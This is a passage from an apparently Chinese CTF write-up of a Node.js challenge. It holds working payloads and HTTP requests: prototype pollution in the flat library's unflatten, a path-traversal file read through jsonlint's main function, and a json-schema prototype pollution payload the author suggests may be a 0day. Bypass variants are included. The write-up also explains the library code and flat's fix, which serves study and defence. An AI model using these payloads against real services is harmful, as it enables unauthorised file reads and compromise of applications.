<span class=p>{</span><span class=nt>&#34;__proto__.path&#34;</span><span class=p>:</span> <span class=s2>&#34;/flag&#34;</span><span class=p>}</span>
</code></pre></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-http data-lang=http><span class=kr>HTTP</span><span class=o>/</span><span class=m>1.1</span> <span class=m>200</span> <span class=ne>OK</span>
<span class=n>Content-Type</span><span class=o>:</span> <span class=l>application/json; charset=utf-8</span>
<span class=n>Content-Length</span><span class=o>:</span> <span class=l>35</span>
<span class=n>ETag</span><span class=o>:</span> <span class=l>W/&#34;23-RVcPh+LK1Ac7n2mAq1KjFd049Xo&#34;</span>
<span class=n>Date</span><span class=o>:</span> <span class=l>Tue, 13 Oct 2020 16:54:07 GMT</span>
<span class=n>Connection</span><span class=o>:</span> <span class=l>close</span>

<span class=p>{</span><span class=nt>&#34;validator&#34;</span><span class=p>:{},</span><span class=nt>&#34;data&#34;</span><span class=p>:</span><span class=s2>&#34;000AAAA\n&#34;</span><span class=p>}</span>
</code></pre></div><p>这个其实是 7/18 @po6ix 提出了 flat lib 中的 <code>unflatten</code> 存在原型链污染：https://github.com/hughsk/flat/issues/105</p>
<p>简单 debug 跟了一下，简化了一下原函数代码：</p>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-javascript data-lang=javascript><span class=kd>function</span> <span class=nx>unflatten</span> <span class=p>(</span><span class=nx>target</span><span class=p>,</span> <span class=nx>opts</span><span class=p>)</span> <span class=p>{</span>
  <span class=nx>opts</span> <span class=o>=</span> <span class=nx>opts</span> <span class=o>||</span> <span class=p>{}</span>

  <span class=kr>const</span> <span class=nx>delimiter</span> <span class=o>=</span> <span class=nx>opts</span><span class=p>.</span><span class=nx>delimiter</span> <span class=o>||</span> <span class=s1>&#39;.&#39;</span>
  <span class=kr>const</span> <span class=nx>overwrite</span> <span class=o>=</span> <span class=nx>opts</span><span class=p>.</span><span class=nx>overwrite</span> <span class=o>||</span> <span class=kc>false</span>
  <span class=kr>const</span> <span class=nx>transformKey</span> <span class=o>=</span> <span class=nx>opts</span><span class=p>.</span><span class=nx>transformKey</span> <span class=o>||</span> <span class=nx>keyIdentity</span>
  <span class=kr>const</span> <span class=nx>result</span> <span class=o>=</span> <span class=p>{}</span>

  <span class=c1>//...
</span><span class=c1></span>
  <span class=nb>Object</span><span class=p>.</span><span class=nx>keys</span><span class=p>(</span><span class=nx>target</span><span class=p>).</span><span class=nx>forEach</span><span class=p>(</span><span class=kd>function</span> <span class=p>(</span><span class=nx>key</span><span class=p>)</span> <span class=p>{</span>
    <span class=kr>const</span> <span class=nx>split</span> <span class=o>=</span> <span class=nx>key</span><span class=p>.</span><span class=nx>split</span><span class=p>(</span><span class=nx>delimiter</span><span class=p>).</span><span class=nx>map</span><span class=p>(</span><span class=nx>transformKey</span><span class=p>)</span>
    <span class=kd>let</span> <span class=nx>key1</span> <span class=o>=</span> <span class=nx>getkey</span><span class=p>(</span><span class=nx>split</span><span class=p>.</span><span class=nx>shift</span><span class=p>())</span>
    <span class=kd>let</span> <span class=nx>key2</span> <span class=o>=</span> <span class=nx>getkey</span><span class=p>(</span><span class=nx>split</span><span class=p>[</span><span class=mi>0</span><span class=p>])</span>
    <span class=kd>let</span> <span class=nx>recipient</span> <span class=o>=</span> <span class=nx>result</span>

    <span class=k>while</span> <span class=p>(</span><span class=nx>key2</span> <span class=o>!==</span> <span class=kc>undefined</span><span class=p>)</span> <span class=p>{</span>
      <span class=kr>const</span> <span class=nx>type</span> <span class=o>=</span> <span class=nb>Object</span><span class=p>.</span><span class=nx>prototype</span><span class=p>.</span><span class=nx>toString</span><span class=p>.</span><span class=nx>call</span><span class=p>(</span><span class=nx>recipient</span><span class=p>[</span><span class=nx>key1</span><span class=p>])</span>
      <span class=kr>const</span> <span class=nx>isobject</span> <span class=o>=</span> <span class=p>(</span>
        <span class=nx>type</span> <span class=o>===</span> <span class=s1>&#39;[object Object]&#39;</span> <span class=o>||</span>
        <span class=nx>type</span> <span class=o>===</span> <span class=s1>&#39;[object Array]&#39;</span>
      <span class=p>)</span>

      <span class=c1>// do not write over falsey, non-undefined values if overwrite is false
</span><span class=c1></span>      <span class=k>if</span> <span class=p>(</span><span class=o>!</span><span class=nx>overwrite</span> <span class=o>&amp;&amp;</span> <span class=o>!</span><span class=nx>isobject</span> <span class=o>&amp;&amp;</span> <span class=k>typeof</span> <span class=nx>recipient</span><span class=p>[</span><span class=nx>key1</span><span class=p>]</span> <span class=o>!==</span> <span class=s1>&#39;undefined&#39;</span><span class=p>)</span> <span class=p>{</span>
        <span class=k>return</span>
      <span class=p>}</span>

      <span class=k>if</span> <span class=p>((</span><span class=nx>overwrite</span> <span class=o>&amp;&amp;</span> <span class=o>!</span><span class=nx>isobject</span><span class=p>)</span> <span class=o>||</span> <span class=p>(</span><span class=o>!</span><span class=nx>overwrite</span> <span class=o>&amp;&amp;</span> <span class=nx>recipient</span><span class=p>[</span><span class=nx>key1</span><span class=p>]</span> <span class=o>==</span> <span class=kc>null</span><span class=p>))</span> <span class=p>{</span>
        <span class=nx>recipient</span><span class=p>[</span><span class=nx>key1</span><span class=p>]</span> <span class=o>=</span> <span class=p>(</span>
          <span class=k>typeof</span> <span class=nx>key2</span> <span class=o>===</span> <span class=s1>&#39;number&#39;</span> <span class=o>&amp;&amp;</span>
          <span class=o>!</span><span class=nx>opts</span><span class=p>.</span><span class=nx>object</span> <span class=o>?</span> <span class=p>[]</span> <span class=o>:</span> <span class=p>{}</span>
        <span class=p>)</span>
      <span class=p>}</span>

      <span class=nx>recipient</span> <span class=o>=</span> <span class=nx>recipient</span><span class=p>[</span><span class=nx>key1</span><span class=p>]</span>
      <span class=k>if</span> <span class=p>(</span><span class=nx>split</span><span class=p>.</span><span class=nx>length</span> <span class=o>&gt;</span> <span class=mi>0</span><span class=p>)</span> <span class=p>{</span>
        <span class=nx>key1</span> <span class=o>=</span> <span class=nx>getkey</span><span class=p>(</span><span class=nx>split</span><span class=p>.</span><span class=nx>shift</span><span class=p>())</span>
        <span class=nx>key2</span> <span class=o>=</span> <span class=nx>getkey</span><span class=p>(</span><span class=nx>split</span><span class=p>[</span><span class=mi>0</span><span class=p>])</span>
      <span class=p>}</span>
    <span class=p>}</span>

    <span class=c1>// unflatten again for &#39;messy objects&#39;
</span><span class=c1></span>    <span class=nx>recipient</span><span class=p>[</span><span class=nx>key1</span><span class=p>]</span> <span class=o>=</span> <span class=nx>unflatten</span><span class=p>(</span><span class=nx>target</span><span class=p>[</span><span class=nx>key</span><span class=p>],</span> <span class=nx>opts</span><span class=p>)</span>
  <span class=p>})</span>

  <span class=k>return</span> <span class=nx>result</span>
<span class=p>}</span>

</code></pre></div><p>我们传入<code>{"__proto__.path": "/flag"}</code> 到 <code>target</code> 变量，然后经过一些判断以及操作，经过 <code>while</code> 第一轮循环得到:</p>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-javascript data-lang=javascript><span class=nx>recipient</span> <span class=o>=</span> <span class=nx>recipient</span><span class=p>[</span><span class=nx>key1</span><span class=p>]</span>		<span class=c1>//recipient = {}[&#34;__proto__&#34;]
</span></code></pre></div><p>此时 <code>recipient</code> 就指向了 <code>Function.prototype</code> ，而循环结束之后递归执行 <code>unflatten</code> 函数，此时</p>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-javascript data-lang=javascript><span class=nx>recipient</span><span class=p>[</span><span class=nx>key1</span><span class=p>]</span> <span class=o>=</span> <span class=nx>unflatten</span><span class=p>(</span><span class=nx>target</span><span class=p>[</span><span class=nx>key</span><span class=p>],</span> <span class=nx>opts</span><span class=p>)</span> 		<span class=c1>// recipient[&#39;path&#39;] = unflatten(&#34;/flag&#34;, {})
</span></code></pre></div><p>而因为传入的第一个参数也就是 <code>/flag</code> 为字符串，被 <code>unflatten</code> 直接返回，也就是说最终结果为：</p>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-javascript data-lang=javascript><span class=nx>recipient</span><span class=p>[</span><span class=nx>key1</span><span class=p>]</span> <span class=o>=</span> <span class=s1>&#39;/flag&#39;</span>		<span class=c1>//recipient[&#39;path&#39;] = &#39;/flag&#39;
</span></code></pre></div><p>整个流程可以简化为：</p>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-javascript data-lang=javascript><span class=kd>var</span> <span class=nx>obj</span> <span class=o>=</span> <span class=p>{};</span>
<span class=kd>var</span> <span class=nx>a</span> <span class=o>=</span> <span class=p>{};</span>
<span class=nx>obj</span> <span class=o>=</span> <span class=nx>obj</span><span class=p>[</span><span class=s2>&#34;__proto__&#34;</span><span class=p>];</span>
<span class=nx>obj</span><span class=p>[</span><span class=s1>&#39;path&#39;</span><span class=p>]</span> <span class=o>=</span> <span class=s1>&#39;/flag&#39;</span><span class=p>;</span>
<span class=nx>console</span><span class=p>.</span><span class=nx>log</span><span class=p>(</span><span class=nx>obj</span><span class=p>.</span><span class=nx>path</span><span class=p>);</span>
<span class=nx>console</span><span class=p>.</span><span class=nx>log</span><span class=p>(</span><span class=nx>a</span><span class=p>.</span><span class=nx>path</span><span class=p>);</span>
</code></pre></div><p>这样就完成了原型链污染的效果，我们就可以将 <code>config.path</code> 污染成 flag 路径了，也就可以读到 flag 了</p>
<p>存在一些变形比如：</p>
<ul>
<li>更改传输方式为<code>application/x-www-form-urlencoded</code></li>
<li>更改引用路径<code>POST /config/validated/..%2fnode_modules%2fflat/unflatten HTTP/1.1</code></li>
</ul>
<p>顺便，flat 已经修复了这个原型链污染，修复方式是将<code>__proto__</code>设置为 <code>key1</code> 的黑名单：https://github.com/hughsk/flat/pull/106/commits/b7815abada29592b0067e391ab215a462a7347e8</p>
<h3 id=jsonlint>Jsonlint</h3>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-http data-lang=http><span class=nf>POST</span> <span class=nn>/config/validated/jsonlint/main</span> <span class=kr>HTTP</span><span class=o>/</span><span class=m>1.1</span>
<span class=n>Host</span><span class=o>:</span> <span class=l>zedd.vv:4017</span>
<span class=n>User-Agent</span><span class=o>:</span> <span class=l>Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:81.0) Gecko/20100101 Firefox/81.0</span>
<span class=n>Accept</span><span class=o>:</span> <span class=l>text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8</span>
<span class=n>Accept-Language</span><span class=o>:</span> <span class=l>zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span>
<span class=n>Accept-Encoding</span><span class=o>:</span> <span class=l>gzip, deflate</span>
<span class=n>Connection</span><span class=o>:</span> <span class=l>close</span>
<span class=n>Upgrade-Insecure-Requests</span><span class=o>:</span> <span class=l>1</span>
<span class=n>Content-Type</span><span class=o>:</span> <span class=l>application/json</span>
<span class=n>Content-Length</span><span class=o>:</span> <span class=l>33</span>

<span class=p>{</span><span class=nt>&#34;1&#34;</span><span class=p>:</span><span class=s2>&#34;../../../../../../../flag&#34;</span><span class=p>}</span>
</code></pre></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-http data-lang=http><span class=kr>HTTP</span><span class=o>/</span><span class=m>1.1</span> <span class=m>500</span> <span class=ne>Internal Server Error</span>
<span class=n>Content-Type</span><span class=o>:</span> <span class=l>text/html; charset=utf-8</span>
<span class=n>Content-Length</span><span class=o>:</span> <span class=l>1162</span>
<span class=n>ETag</span><span class=o>:</span> <span class=l>W/&#34;48a-J1p7tUkAXQsyvitsec7yxDGU9yc&#34;</span>
<span class=n>Date</span><span class=o>:</span> <span class=l>Tue, 13 Oct 2020 16:58:55 GMT</span>
<span class=n>Connection</span><span class=o>:</span> <span class=l>close</span>

<span class=p>&lt;</span><span class=nt>h1</span><span class=p>&gt;</span>Parse error on line 1:
000AAAA
^
Expecting <span class=ni>&amp;#39;</span>STRING<span class=ni>&amp;#39;</span>, <span class=ni>&amp;#39;</span>NUMBER<span class=ni>&amp;#39;</span>, <span class=ni>&amp;#39;</span>NULL<span class=ni>&amp;#39;</span>, <span class=ni>&amp;#39;</span>TRUE<span class=ni>&amp;#39;</span>, <span class=ni>&amp;#39;</span>FALSE<span class=ni>&amp;#39;</span>, <span class=ni>&amp;#39;</span>{<span class=ni>&amp;#39;</span>, <span class=ni>&amp;#39;</span>[<span class=ni>&amp;#39;</span>, got <span class=ni>&amp;#39;</span>undefined<span class=ni>&amp;#39;</span><span class=p>&lt;/</span><span class=nt>h1</span><span class=p>&gt;</span>
<span class=p>&lt;</span><span class=nt>h2</span><span class=p>&gt;&lt;/</span><span class=nt>h2</span><span class=p>&gt;</span>
<span class=p>&lt;</span><span class=nt>pre</span><span class=p>&gt;</span>Error: Parse error on line 1:
000AAAA
^
Expecting <span class=ni>&amp;#39;</span>STRING<span class=ni>&amp;#39;</span>, <span class=ni>&amp;#39;</span>NUMBER<span class=ni>&amp;#39;</span>, <span class=ni>&amp;#39;</span>NULL<span class=ni>&amp;#39;</span>, <span class=ni>&amp;#39;</span>TRUE<span class=ni>&amp;#39;</span>, <span class=ni>&amp;#39;</span>FALSE<span class=ni>&amp;#39;</span>, <span class=ni>&amp;#39;</span>{<span class=ni>&amp;#39;</span>, <span class=ni>&amp;#39;</span>[<span class=ni>&amp;#39;</span>, got <span class=ni>&amp;#39;</span>undefined<span class=ni>&amp;#39;</span>
    at Object.parseError (/service/node_modules/jsonlint/lib/jsonlint.js:55:11)
    at Object.parse (/service/node_modules/jsonlint/lib/jsonlint.js:132:22)
    at Object.commonjsMain [as main] (/service/node_modules/jsonlint/lib/jsonlint.js:427:27)
    at /service/routes/config.js:22:36
    at Layer.handle [as handle_request] (/service/node_modules/express/lib/router/layer.js:95:5)
    at next (/service/node_modules/express/lib/router/route.js:137:13)
    at Route.dispatch (/service/node_modules/express/lib/router/route.js:112:3)
    at Layer.handle [as handle_request] (/service/node_modules/express/lib/router/layer.js:95:5)
    at /service/node_modules/express/lib/router/index.js:281:22
    at param (/service/node_modules/express/lib/router/index.js:354:14)<span class=p>&lt;/</span><span class=nt>pre</span><span class=p>&gt;</span>

</code></pre></div><p>这个也比较简单，jsonlint lib 中有一个 main 函数存在直接引用文件的操作：</p>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-javascript data-lang=javascript><span class=nx>exports</span><span class=p>.</span><span class=nx>main</span> <span class=o>=</span> <span class=kd>function</span> <span class=nx>commonjsMain</span><span class=p>(</span><span class=nx>args</span><span class=p>)</span> <span class=p>{</span>
    <span class=k>if</span> <span class=p>(</span><span class=o>!</span><span class=nx>args</span><span class=p>[</span><span class=mi>1</span><span class=p>])</span>
        <span class=k>throw</span> <span class=k>new</span> <span class=nb>Error</span><span class=p>(</span><span class=s1>&#39;Usage: &#39;</span><span class=o>+</span><span class=nx>args</span><span class=p>[</span><span class=mi>0</span><span class=p>]</span><span class=o>+</span><span class=s1>&#39; FILE&#39;</span><span class=p>);</span>
    <span class=k>if</span> <span class=p>(</span><span class=k>typeof</span> <span class=nx>process</span> <span class=o>!==</span> <span class=s1>&#39;undefined&#39;</span><span class=p>)</span> <span class=p>{</span>
        <span class=kd>var</span> <span class=nx>source</span> <span class=o>=</span> <span class=nx>require</span><span class=p>(</span><span class=s1>&#39;fs&#39;</span><span class=p>).</span><span class=nx>readFileSync</span><span class=p>(</span><span class=nx>require</span><span class=p>(</span><span class=s1>&#39;path&#39;</span><span class=p>).</span><span class=nx>join</span><span class=p>(</span><span class=nx>process</span><span class=p>.</span><span class=nx>cwd</span><span class=p>(),</span> <span class=nx>args</span><span class=p>[</span><span class=mi>1</span><span class=p>]),</span> <span class=s2>&#34;utf8&#34;</span><span class=p>);</span>
    <span class=p>}</span> <span class=k>else</span> <span class=p>{</span>
        <span class=kd>var</span> <span class=nx>cwd</span> <span class=o>=</span> <span class=nx>require</span><span class=p>(</span><span class=s2>&#34;file&#34;</span><span class=p>).</span><span class=nx>path</span><span class=p>(</span><span class=nx>require</span><span class=p>(</span><span class=s2>&#34;file&#34;</span><span class=p>).</span><span class=nx>cwd</span><span class=p>());</span>
        <span class=kd>var</span> <span class=nx>source</span> <span class=o>=</span> <span class=nx>cwd</span><span class=p>.</span><span class=nx>join</span><span class=p>(</span><span class=nx>args</span><span class=p>[</span><span class=mi>1</span><span class=p>]).</span><span class=nx>read</span><span class=p>({</span><span class=nx>charset</span><span class=o>:</span> <span class=s2>&#34;utf-8&#34;</span><span class=p>});</span>
    <span class=p>}</span>
    <span class=k>return</span> <span class=nx>exports</span><span class=p>.</span><span class=nx>parser</span><span class=p>.</span><span class=nx>parse</span><span class=p>(</span><span class=nx>source</span><span class=p>);</span>
<span class=p>}</span>
</code></pre></div><p>而 <code>args</code> 则是我们传入的<code>req.body</code>，也就是<code>{"1":"../../../../../../../flag"}</code>，直接引入 flag 文件导致报错回显即可。</p>
<h3 id=json-schema>json-schema</h3>
<p>这个库算是官方给的一个 hint 吧，因为算是在<code>/config/validated</code>路由默认使用的 lib ，而且搜了一下是一个废弃的仓库：https://github.com/kriszyp/json-schema/ ，而且看起来还能算是一个 0day</p>
<pre tabindex=0><code>{&quot;$schema&quot;: {&quot;properties&quot;: {&quot;__proto__&quot;: {&quot;properties&quot;: {&quot;path&quot;: {&quot;default&quot;: &quot;/flag&quot;}}}}}}
</code></pre><p>经过简单调试可以发现主要问题在两个函数：<code>checkObj</code> 与 <code>checkProp</code></p>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-javascript data-lang=javascript><span class=c1>// validate a value against a property definition
</span><span class=c1></span><span class=kd>function</span> <span class=nx>checkProp</span><span class=p>(</span><span class=nx>value</span><span class=p>,</span> <span class=nx>schema</span><span class=p>,</span> <span class=nx>path</span><span class=p>,</span> <span class=nx>i</span><span class=p>)</span> <span class=p>{</span>

  <span class=kd>var</span> <span class=nx>l</span><span class=p>;</span>
  <span class=nx>path</span> <span class=o>+=</span> <span class=nx>path</span> <span class=o>?</span> <span class=k>typeof</span> <span class=nx>i</span> <span class=o>==</span> <span class=s1>&#39;number&#39;</span> <span class=o>?</span> <span class=s1>&#39;[&#39;</span> <span class=o>+</span> <span class=nx>i</span> <span class=o>+</span> <span class=s1>&#39;]&#39;</span><span class=o>:</span> <span class=k>typeof</span> <span class=nx>i</span> <span class=o>==</span> <span class=s1>&#39;undefined&#39;</span> <span class=o>?</span> <span class=s1>&#39;&#39;</span><span class=o>:</span> <span class=s1>&#39;.&#39;</span> <span class=o>+</span> <span class=nx>i</span><span class=o>:</span> <span class=nx>i</span><span class=p>;</span>
  <span class=kd>function</span> <span class=nx>addError</span><span class=p>(</span><span class=nx>message</span><span class=p>)</span> <span class=p>{</span>
    <span class=nx>errors</span><span class=p>.</span><span class=nx>push</span><span class=p>({</span>
      <span class=nx>property</span><span class=o>:</span> <span class=nx>path</span><span class=p>,</span>
      <span class=nx>message</span><span class=o>:</span> <span class=nx>message</span>
    <span class=p>});</span>
  <span class=p>}</span>

  <span class=k>if</span> <span class=p>((</span><span class=k>typeof</span> <span class=nx>schema</span> <span class=o>!=</span> <span class=s1>&#39;object&#39;</span> <span class=o>||</span> <span class=nx>schema</span> <span class=k>instanceof</span> <span class=nb>Array</span><span class=p>)</span> <span class=o>&amp;&amp;</span> <span class=p>(</span><span class=nx>path</span> <span class=o>||</span> <span class=k>typeof</span> <span class=nx>schema</span> <span class=o>!=</span> <span class=s1>&#39;function&#39;</span><span class=p>)</span> <span class=o>&amp;&amp;</span> <span class=o>!</span><span class=p>(</span><span class=nx>schema</span> <span class=o>&amp;&amp;</span> <span class=nx>getType</span><span class=p>(</span><span class=nx>schema</span><span class=p>)))</span> <span class=p>{</span>
    <span class=k>if</span> <span class=p>(</span><span class=k>typeof</span> <span class=nx>schema</span> <span class=o>==</span> <span class=s1>&#39;function&#39;</span><span class=p>)</span> <span class=p>{</span>
      <span class=k>if</span> <span class=p>(</span><span class=o>!</span> <span class=p>(</span><span class=nx>value</span> <span class=k>instanceof</span> <span class=nx>schema</span><span class=p>))</span> <span class=p>{</span>
        <span class=nx>addError</span><span class=p>(</span><span class=s2>&#34;is not an instance of the class/constructor &#34;</span> <span class=o>+</span> <span class=nx>schema</span><span class=p>.</span><span class=nx>name</span><span class=p>);</span>
      <span class=p>}</span>
    <span class=p>}</span> <span class=k>else</span> <span class=k>if</span> <span class=p>(</span><span class=nx>schema</span><span class=p>)</span> <span class=p>{</span>
      <span class=nx>addError</span><span class=p>(</span><span class=s2>&#34;Invalid schema/property definition &#34;</span> <span class=o>+</span> <span class=nx>schema</span><span class=p>);</span>
    <span class=p>}</span>
    <span class=k>return</span> <span class=kc>null</span><span class=p>;</span>
  <span class=p>}</span>
  <span class=k>if</span> <span class=p>(</span><span class=nx>_changing</span> <span class=o>&amp;&amp;</span> <span class=nx>schema</span><span class=p>.</span><span class=nx>readonly</span><span class=p>)</span> <span class=p>{</span>
    <span class=nx>addError</span><span class=p>(</span><span class=s2>&#34;is a readonly field, it can not be changed&#34;</span><span class=p>);</span>
  <span class=p>}</span>
  <span class=k>if</span> <span class=p>(</span><span class=nx>schema</span><span class=p>[</span><span class=s1>&#39;extends&#39;</span><span class=p>])</span> <span class=p>{</span> <span class=c1>// if it extends another schema, it must pass that schema as well
</span><span class=c1></span>    <span class=nx>checkProp</span><span class=p>(</span><span class=nx>value</span><span class=p>,</span> <span class=nx>schema</span><span class=p>[</span><span class=s1>&#39;extends&#39;</span><span class=p>],</span> <span class=nx>path</span><span class=p>,</span> <span class=nx>i</span><span class=p>);</span>
  <span class=p>}</span>
  <span class=c1>// validate a value against a type definition
</span><span class=c1></span>  <span class=kd>function</span> <span class=nx>checkType</span><span class=p>(</span><span class=nx>type</span><span class=p>,</span> <span class=nx>value</span><span class=p>)</span> <span class=p>{</span>
    <span class=k>if</span> <span class=p>(</span><span class=nx>type</span><span class=p>)</span> <span class=p>{</span>
      <span class=k>if</span> <span class=p>(</span><span class=k>typeof</span> <span class=nx>type</span> <span class=o>==</span> <span class=s1>&#39;string&#39;</span> <span class=o>&amp;&amp;</span> <span class=nx>type</span> <span class=o>!=</span> <span class=s1>&#39;any&#39;</span> <span class=o>&amp;&amp;</span> <span class=p>(</span><span class=nx>type</span> <span class=o>==</span> <span class=s1>&#39;null&#39;</span> <span class=o>?</span> <span class=nx>value</span> <span class=o>!==</span> <span class=kc>null</span><span class=o>:</span> <span class=k>typeof</span> <span class=nx>value</span> <span class=o>!=</span> <span class=nx>type</span><span class=p>)</span> <span class=o>&amp;&amp;</span> <span class=o>!</span><span class=p>(</span><span class=nx>value</span> <span class=k>instanceof</span> <span class=nb>Array</span> <span class=o>&amp;&amp;</span> <span class=nx>type</span> <span class=o>==</span> <span class=s1>&#39;array&#39;</span><span class=p>)</span> <span class=o>&amp;&amp;</span> <span class=o>!</span><span class=p>(</span><span class=nx>value</span> <span class=k>instanceof</span> <span class=nb>Date</span> <span class=o>&amp;&amp;</span> <span class=nx>type</span> <span class=o>==</span> <span class=s1>&#39;date&#39;</span><span class=p>)</span> <span class=o>&amp;&amp;</span> <span class=o>!</span><span class=p>(</span><span class=nx>type</span> <span class=o>==</span> <span class=s1>&#39;integer&#39;</span> <span class=o>&amp;&amp;</span> <span class=nx>value</span> <span class=o>%</span> <span class=mi>1</span> <span class=o>===</span> <span class=mi>0</span><span class=p>))</span> <span class=p>{</span>
        <span class=k>return</span> <span class=p>[{</span>
          <span class=nx>property</span><span class=o>:</span> <span class=nx>path</span><span class=p>,</span>
          <span class=nx>message</span><span class=o>:</span> <span class=p>(</span><span class=k>typeof</span> <span class=nx>value</span><span class=p>)</span> <span class=o>+</span> <span class=s2>&#34; value found, but a &#34;</span> <span class=o>+</span> <span class=nx>type</span> <span class=o>+</span> <span class=s2>&#34; is required&#34;</span>
        <span class=p>}];</span>
      <span class=p>}</span>
      <span class=k>if</span> <span class=p>(</span><span class=nx>type</span> <span class=k>instanceof</span> <span class=nb>Array</span><span class=p>)</span> <span class=p>{</span>
        <span class=kd>var</span> <span class=nx>unionErrors</span> <span class=o>=</span> <span class=p>[];</span>
        <span class=k>for</span> <span class=p>(</span><span class=kd>var</span> <span class=nx>j</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span> <span class=nx>j</span> <span class=o>&lt;</span> <span class=nx>type</span><span class=p>.</span><span class=nx>length</span><span class=p>;</span> <span class=nx>j</span><span class=o>++</span><span class=p>)</span> <span class=p>{</span> <span class=c1>// a union type
</span><span class=c1></span>          <span class=k>if</span> <span class=p>(</span><span class=o>!</span> <span class=p>(</span><span class=nx>unionErrors</span> <span class=o>=</span> <span class=nx>checkType</span><span class=p>(</span><span class=nx>type</span><span class=p>[</span><span class=nx>j</span><span class=p>],</span> <span class=nx>value</span><span class=p>)).</span><span class=nx>length</span><span class=p>)</span> <span class=p>{</span>
            <span class=k>break</span><span class=p>;</span>
          <span class=p>}</span>
        <span class=p>}</span>
        <span class=k>if</span> <span class=p>(</span><span class=nx>unionErrors</span><span class=p>.</span><span class=nx>length</span><span class=p>)</span> <span class=p>{</span>
          <span class=k>return</span> <span class=nx>unionErrors</span><span class=p>;</span>
        <span class=p>}</span>
      <span class=p>}</span> <span class=k>else</span> <span class=k>if</span> <span class=p>(</span><span class=k>typeof</span> <span class=nx>type</span> <span class=o>==</span> <span class=s1>&#39;object&#39;</span><span class=p>)</span> <span class=p>{</span>
        <span class=kd>var</span> <span class=nx>priorErrors</span> <span class=o>=</span> <span class=nx>errors</span><span class=p>;</span>
        <span class=nx>errors</span> <span class=o>=</span> <span class=p>[];</span>
        <span class=nx>checkProp</span><span class=p>(</span><span class=nx>value</span><span class=p>,</span> <span class=nx>type</span><span class=p>,</span> <span class=nx>path</span><span class=p>);</span>
        <span class=kd>var</span> <span class=nx>theseErrors</span> <span class=o>=</span> <span class=nx>errors</span><span class=p>;</span>
        <span class=nx>errors</span> <span class=o>=</span> <span class=nx>priorErrors</span><span class=p>;</span>
        <span class=k>return</span> <span class=nx>theseErrors</span><span class=p>;</span>
      <span class=p>}</span>
    <span class=p>}</span>
    <span class=k>return</span> <span class=p>[];</span>
  <span class=p>}</span>
  <span class=k>if</span> <span class=p>(</span><span class=nx>value</span> <span class=o>===</span> <span class=kc>undefined</span><span class=p>)</span> <span class=p>{</span>
    <span class=k>if</span> <span class=p>(</span><span class=nx>schema</span><span class=p>.</span><span class=nx>required</span><span class=p>)</span> <span class=p>{</span>
      <span class=nx>addError</span><span class=p>(</span><span class=s2>&#34;is missing and it is required&#34;</span><span class=p>);</span>
    <span class=p>}</span>
  <span class=p>}</span> <span class=k>else</span> <span class=p>{</span>
    <span class=nx>errors</span> <span class=o>=</span> <span class=nx>errors</span><span class=p>.</span><span class=nx>concat</span><span class=p>(</span><span class=nx>checkType</span><span class=p>(</span><span class=nx>getType</span><span class=p>(</span><span class=nx>schema</span><span class=p>),</span> <span class=nx>value</span><span class=p>));</span>
    <span class=k>if</span> <span class=p>(</span><span class=nx>schema</span><span class=p>.</span><span class=nx>disallow</span> <span class=o>&amp;&amp;</span> <span class=o>!</span><span class=nx>checkType</span><span class=p>(</span><span class=nx>schema</span><span class=p>.</span><span class=nx>disallow</span><span class=p>,</span> <span class=nx>value</span><span class=p>).</span><span class=nx>length</span><span class=p>)</span> <span class=p>{</span>
      <span class=nx>addError</span><span class=p>(</span><span class=s2>&#34; disallowed value was matched&#34;</span><span class=p>);</span>
    <span class=p>}</span>
    <span class=k>if</span> <span class=p>(</span><span class=nx>value</span> <span class=o>!==</span> <span class=kc>null</span><span class=p>)</span> <span class=p>{</span>
      <span class=k>if</span> <span class=p>(</span><span class=nx>value</span> <span class=k>instanceof</span> <span class=nb>Array</span><span class=p>)</span> <span class=p>{</span>
        <span class=k>if</span> <span class=p>(</span><span class=nx>schema</span><span class=p>.</span><span class=nx>items</span><span class=p>)</span> <span class=p>{</span>
          <span class=kd>var</span> <span class=nx>itemsIsArray</span> <span class=o>=</span> <span class=nx>schema</span><span class=p>.</span><span class=nx>items</span> <span class=k>instanceof</span> <span class=nb>Array</span><span class=p>;</span>
          <span class=kd>var</span> <span class=nx>propDef</span> <span class=o>=</span> <span class=nx>schema</span><span class=p>.</span><span class=nx>items</span><span class=p>;</span>
          <span class=k>for</span> <span class=p>(</span><span class=nx>i</span> <span class=o>=</span> <span class=mi>0</span><span class=p>,</span> <span class=nx>l</span> <span class=o>=</span> <span class=nx>value</span><span class=p>.</span><span class=nx>length</span><span class=p>;</span> <span class=nx>i</span> <span class=o>&lt;</span> <span class=nx>l</span><span class=p>;</span> <span class=nx>i</span> <span class=o>+=</span> <span class=mi>1</span><span class=p>)</span> <span class=p>{</span>
            <span class=k>if</span> <span class=p>(</span><span class=nx>itemsIsArray</span><span class=p>)</span> <span class=nx>propDef</span> <span class=o>=</span> <span class=nx>schema</span><span class=p>.</span><span class=nx>items</span><span class=p>[</span><span class=nx>i</span><span class=p>];</span>
            <span class=k>if</span> <span class=p>(</span><span class=nx>options</span><span class=p>.</span><span class=nx>coerce</span><span class=p>)</span> <span class=nx>value</span><span class=p>[</span><span class=nx>i</span><span class=p>]</span> <span class=o>=</span> <span class=nx>options</span><span class=p>.</span><span class=nx>coerce</span><span class=p>(</span><span class=nx>value</span><span class=p>[</span><span class=nx>i</span><span class=p>],</span> <span class=nx>propDef</span><span class=p>);</span>
            <span class=nx>errors</span><span class=p>.</span><span class=nx>concat</span><span class=p>(</span><span class=nx>checkProp</span><span class=p>(</span><span class=nx>value</span><span class=p>[</span><span class=nx>i</span><span class=p>],</span> <span class=nx>propDef</span><span class=p>,</span> <span class=nx>path</span><span class=p>,</span> <span class=nx>i</span><span class=p>));</span>
          <span class=p>}</span>
        <span class=p>}</span>
